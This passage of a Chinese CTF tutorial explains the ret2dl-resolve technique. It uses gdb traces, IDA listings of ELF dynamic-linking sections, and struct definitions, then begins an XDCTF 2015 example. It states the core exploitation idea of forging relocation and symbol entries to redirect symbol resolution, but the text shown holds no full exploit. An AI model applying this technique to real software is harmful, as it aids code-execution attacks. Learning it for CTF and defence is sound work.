<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ gdb a.out</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b *0x080482e0</span><br><span class="line">Breakpoint 1 at 0x80482e0</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080482e0 <span class="keyword">in</span> puts@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x8048500 ◂— dec    eax /* <span class="string">'Hello Pwn\n'</span> */</span><br><span class="line"> EBX  0x804a000 —▸ 0x8049f14 ◂— 0x1</span><br><span class="line"> ECX  0xffffd140 ◂— 0x1</span><br><span class="line"> EDX  0xffffd164 ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d4d6c</span><br><span class="line"> EBP  0xffffd128 ◂— 0x0</span><br><span class="line"> ESP  0xffffd10c —▸ 0x804844f ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80482e0 (puts@plt) ◂— jmp    dword ptr [0x804a00c]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80482e0  &lt;puts@plt&gt;                  jmp    dword ptr [0x804a00c]</span><br><span class="line"> </span><br><span class="line">   0x80482e6  &lt;puts@plt+6&gt;                push   0</span><br><span class="line">   0x80482eb  &lt;puts@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [0x804a004]</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fead80&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fead80 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fead81 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fead82 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fead83 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fead87 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fead8b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe4f30&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd10c —▸ 0x804844f ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd110 —▸ 0x8048500 ◂— dec    eax /* <span class="string">'Hello Pwn\n'</span> */</span><br><span class="line">02:0008│      0xffffd114 —▸ 0xffffd1d4 —▸ 0xffffd385 ◂— <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out'</span></span><br><span class="line">03:000c│      0xffffd118 —▸ 0xffffd1dc —▸ 0xffffd3b8 ◂— <span class="string">'QT_DBL_CLICK_DIST=15'</span></span><br><span class="line">04:0010│      0xffffd11c —▸ 0x804843a ◂— add    ebx, 0x1bc6</span><br><span class="line">05:0014│      0xffffd120 —▸ 0xffffd140 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd124 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80482e0 puts@plt</span><br><span class="line">   f 1  804844f</span><br><span class="line">   f 2 f7deee81 __libc_start_main+241</span><br><span class="line">Breakpoint *0x80482e0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Hello Pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080482e0 <span class="keyword">in</span> puts@plt ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x804850b ◂— ja     0x8048572 /* <span class="string">'welcome\n'</span> */</span><br><span class="line"> EBX  0x804a000 —▸ 0x8049f14 ◂— 0x1</span><br><span class="line"> ECX  0x804b160 ◂— <span class="string">'\nello Pwn\n'</span></span><br><span class="line"> EDX  0xf7fac890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fab000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d4d6c</span><br><span class="line"> EBP  0xffffd128 ◂— 0x0</span><br><span class="line"> ESP  0xffffd10c —▸ 0x8048461 ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80482e0 (puts@plt) ◂— jmp    dword ptr [0x804a00c]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80482e0  &lt;puts@plt&gt;    jmp    dword ptr [0x804a00c] &lt;0xf7e3d250&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e3d250 &lt;puts&gt;        push   ebp</span><br><span class="line">   0xf7e3d251 &lt;puts+1&gt;      mov    ebp, esp</span><br><span class="line">   0xf7e3d253 &lt;puts+3&gt;      push   edi</span><br><span class="line">   0xf7e3d254 &lt;puts+4&gt;      push   esi</span><br><span class="line">   0xf7e3d255 &lt;puts+5&gt;      push   ebx</span><br><span class="line">   0xf7e3d256 &lt;puts+6&gt;      call   __x86.get_pc_thunk.di &lt;0xf7f0ad7d&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7e3d25b &lt;puts+11&gt;     add    edi, 0x16dda5</span><br><span class="line">   0xf7e3d261 &lt;puts+17&gt;     sub    esp, 0x28</span><br><span class="line">   0xf7e3d264 &lt;puts+20&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">   0xf7e3d267 &lt;puts+23&gt;     call   __strlen_ia32 &lt;0xf7e6e630&gt;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd10c —▸ 0x8048461 ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd110 —▸ 0x804850b ◂— ja     0x8048572 /* <span class="string">'welcome\n'</span> */</span><br><span class="line">02:0008│      0xffffd114 —▸ 0xffffd1d4 —▸ 0xffffd385 ◂— <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/a.out'</span></span><br><span class="line">03:000c│      0xffffd118 —▸ 0xffffd1dc —▸ 0xffffd3b8 ◂— <span class="string">'QT_DBL_CLICK_DIST=15'</span></span><br><span class="line">04:0010│      0xffffd11c —▸ 0x804843a ◂— add    ebx, 0x1bc6</span><br><span class="line">05:0014│      0xffffd120 —▸ 0xffffd140 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd124 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80482e0 puts@plt</span><br><span class="line">   f 1  8048461</span><br><span class="line">   f 2 f7deee81 __libc_start_main+241</span><br><span class="line">Breakpoint *0x80482e0</span><br></pre></td></tr></table></figure>
<p>可以发现，0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazy<br>load)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword ptr [0x804a004]，待会会说这两个参数是什么意思，最后跳到libc的_dl_runtime_resolve去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定。而第二次调用puts函数则直接指向puts函数的地址，懂得了上面的东西，我们还需要知道一些结构体，类比PE文件的一些结构，用来索引一些结构。</p>
<p><strong>.dynamic</strong></p>
<p>dynamic结构包含了一些关于动态链接的关键信息，我们只需要关注<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三个字段，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14                   ; ELF Dynamic Information</span><br><span class="line">LOAD:08049F14                   ; ===========================================================================</span><br><span class="line">LOAD:08049F14</span><br><span class="line">LOAD:08049F14                   ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14                   ; Segment permissions: Read/Write</span><br><span class="line">LOAD:08049F14                   LOAD segment mempage public &apos;DATA&apos; use32</span><br><span class="line">LOAD:08049F14                   assume cs:LOAD</span><br><span class="line">LOAD:08049F14 01 00 00 00 01 00+stru_8049F14 Elf32_Dyn &lt;1, &lt;1&gt;&gt;</span><br><span class="line">LOAD:08049F14 00 00                                           ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                                 ; .got.plt:0804A000↓o</span><br><span class="line">LOAD:08049F14                                                 ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C 0C 00 00 00 A8 82+Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt;   ; DT_INIT</span><br><span class="line">LOAD:08049F24 0D 00 00 00 D4 84+Elf32_Dyn &lt;0Dh, &lt;80484D4h&gt;&gt;   ; DT_FINI</span><br><span class="line">LOAD:08049F2C 19 00 00 00 0C 9F+Elf32_Dyn &lt;19h, &lt;8049F0Ch&gt;&gt;   ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34 1B 00 00 00 04 00+Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;          ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C 1A 00 00 00 10 9F+Elf32_Dyn &lt;1Ah, &lt;8049F10h&gt;&gt;   ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44 1C 00 00 00 04 00+Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;          ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C F5 FE FF 6F AC 81+Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54 05 00 00 00 1C 82+Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt;     ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C 06 00 00 00 CC 81+Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt;     ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64 0A 00 00 00 4A 00+Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;        ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C 0B 00 00 00 10 00+Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;        ; DT_SYMENT</span><br><span class="line">LOAD:08049F74 15 00 00 00 00 00+Elf32_Dyn &lt;15h, &lt;0&gt;&gt;          ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C 03 00 00 00 00 A0+Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt;     ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84 02 00 00 00 10 00+Elf32_Dyn &lt;2, &lt;10h&gt;&gt;          ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C 14 00 00 00 11 00+Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;        ; DT_PLTREL</span><br><span class="line">LOAD:08049F94 17 00 00 00 98 82+Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt;   ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C 11 00 00 00 90 82+Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt;   ; DT_REL</span><br><span class="line">LOAD:08049FA4 12 00 00 00 08 00+Elf32_Dyn &lt;12h, &lt;8&gt;&gt;          ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC 13 00 00 00 08 00+Elf32_Dyn &lt;13h, &lt;8&gt;&gt;          ; DT_RELENT</span><br><span class="line">LOAD:08049FB4 FE FF FF 6F 70 82+Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC FF FF FF 6F 01 00+Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt;    ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4 F0 FF FF 6F 66 82+Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC 00 00 00 00 00 00+Elf32_Dyn &lt;0&gt;                 ; DT_NULL</span><br></pre></td></tr></table></figure>
<p><strong>.dynstr</strong></p>
<p>.dynstr是一个字符串表，index[0]的地方永远是0，然后后面是动态链接所需的字符串，以0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C                   ; ELF String Table</span><br><span class="line">LOAD:0804821C 00                byte_804821C db 0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:080481EC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:080481FC↑o</span><br><span class="line">LOAD:0804821C                                                 ; LOAD:0804820C↑o</span><br><span class="line">LOAD:0804821D 6C 69 62 63 2E 73+aLibcSo6 db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048227 5F 49 4F 5F 73 74+aIoStdinUsed db &apos;_IO_stdin_used&apos;,0</span><br><span class="line">LOAD:08048227 64 69 6E 5F 75 73+                              ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 70 75 74 73 00    aPuts db &apos;puts&apos;,0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B 5F 5F 6C 69 62 63+aLibcStartMain db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:0804823B 5F 73 74 61 72 74+                              ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D 47 4C 49 42 43 5F+aGlibc20 db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:08048257 5F 5F 67 6D 6F 6E+aGmonStart db &apos;__gmon_start__&apos;,0</span><br><span class="line">LOAD:08048257 5F 73 74 61 72 74+                              ; DATA XREF: LOAD:080481EC↑o</span><br></pre></td></tr></table></figure>
<p><strong>.dynsym</strong></p>
<p>结构如下，这是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比如puts函数。结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
<p>在IDA中显示如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC                   ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC 00 00 00 00 00 00+Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC 1A 00 00 00 00 00+Elf32_Sym &lt;offset aPuts - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; &quot;puts&quot;</span><br><span class="line">LOAD:080481EC 3B 00 00 00 00 00+Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:080481FC 1F 00 00 00 00 00+Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804820C 0B 00 00 00 EC 84+Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, offset _IO_stdin_used, 4, 11h, 0, 10h&gt; ; &quot;_IO_stdin_used&quot;</span><br></pre></td></tr></table></figure>
<p><strong>.rel.plt</strong></p>
<p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info; <span class="comment">//重定位入口的类型和符号</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<p>在IDA中显示如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048298                   ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298 0C A0 04 08 07 01+Elf32_Rel &lt;804A00Ch, 107h&gt;    ; R_386_JMP_SLOT puts</span><br><span class="line">LOAD:080482A0 10 A0 04 08 07 03+Elf32_Rel &lt;804A010h, 307h&gt;    ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482A0 00 00             LOAD ends</span><br></pre></td></tr></table></figure>
<p>上面的结构体看起来也挺迷糊人的，我只是根据一位大佬的文章总结过来的，下面才是我们需要清楚的关键函数 _dl_runtime_resolve(link_map_obj, reloc_index) ，源码可以在<a href="https://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">这里</a>下载。</p>
<p>_dl_runtime_resolve函数运行模式如下：</p>
<ol>
<li>用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li>
<li>.rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li>
<li>rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li>
<li>.dynstr + sym-&gt;st_name得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li>
<li>调用这个函数</li>
</ol>
<p>利用方法主要是伪造rel.plt表和symtab表，并且修改reloc_index，让重定位函数解析我们伪造的结构体，借此修改符号解析的位置，对于一些字段的获取，我们可以用objdump来寻找，如下图</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .rel.plt ./main</span><br><span class="line"></span><br><span class="line">./main：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .rel.plt:</span><br><span class="line"> 8048330 0ca00408 07010000 10a00408 07020000  ................</span><br><span class="line"> 8048340 14a00408 07040000 18a00408 07050000  ................</span><br><span class="line"> 8048350 1ca00408 07060000                    ........        </span><br><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .dynsym ./main</span><br><span class="line"></span><br><span class="line">./main：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .dynsym:</span><br><span class="line"> 80481d8 00000000 00000000 00000000 00000000  ................</span><br><span class="line"> 80481e8 33000000 00000000 00000000 12000000  3...............</span><br><span class="line"> 80481f8 27000000 00000000 00000000 12000000  <span class="string">'...............</span></span><br><span class="line"><span class="string"> 8048208 52000000 00000000 00000000 20000000  R........... ...</span></span><br><span class="line"><span class="string"> 8048218 20000000 00000000 00000000 12000000   ...............</span></span><br><span class="line"><span class="string"> 8048228 3a000000 00000000 00000000 12000000  :...............</span></span><br><span class="line"><span class="string"> 8048238 4c000000 00000000 00000000 12000000  L...............</span></span><br><span class="line"><span class="string"> 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........</span></span><br><span class="line"><span class="string"> 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........</span></span><br><span class="line"><span class="string"> 8048268 1a000000 40a00408 04000000 11001a00  ....@...........</span></span><br><span class="line"><span class="string">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ objdump -s -j .dynstr ./main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">./main：     文件格式 elf32-i386</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contents of section .dynstr:</span></span><br><span class="line"><span class="string"> 8048278 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s</span></span><br><span class="line"><span class="string"> 8048288 7464696e 5f757365 64007374 64696e00  tdin_used.stdin.</span></span><br><span class="line"><span class="string"> 8048298 7374726c 656e0072 65616400 7374646f  strlen.read.stdo</span></span><br><span class="line"><span class="string"> 80482a8 75740073 65746275 66005f5f 6c696263  ut.setbuf.__libc</span></span><br><span class="line"><span class="string"> 80482b8 5f737461 72745f6d 61696e00 77726974  _start_main.writ</span></span><br><span class="line"><span class="string"> 80482c8 65005f5f 676d6f6e 5f737461 72745f5f  e.__gmon_start__</span></span><br><span class="line"><span class="string"> 80482d8 00474c49 42435f32 2e3000             .GLIBC_2.0.</span></span><br></pre></td></tr></table></figure>
<h3 id="0x01：例子"><a href="#0x01：例子" class="headerlink" title="0x01：例子"></a>0x01：例子</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2dlresolve/XDCTF-2015/main" target="_blank" rel="noopener">题目链接</a></p>
<p>首先检查保护机制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">thunder@thunder-PC:~/Desktop/CTF/pwn/ret2dl-resolve$ checksec main</span><br><span class="line">[*] <span class="string">'/home/thunder/Desktop/CTF/pwn/ret2dl-resolve/main'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+18h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to XDCTF2015~!\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vuln</strong></p>
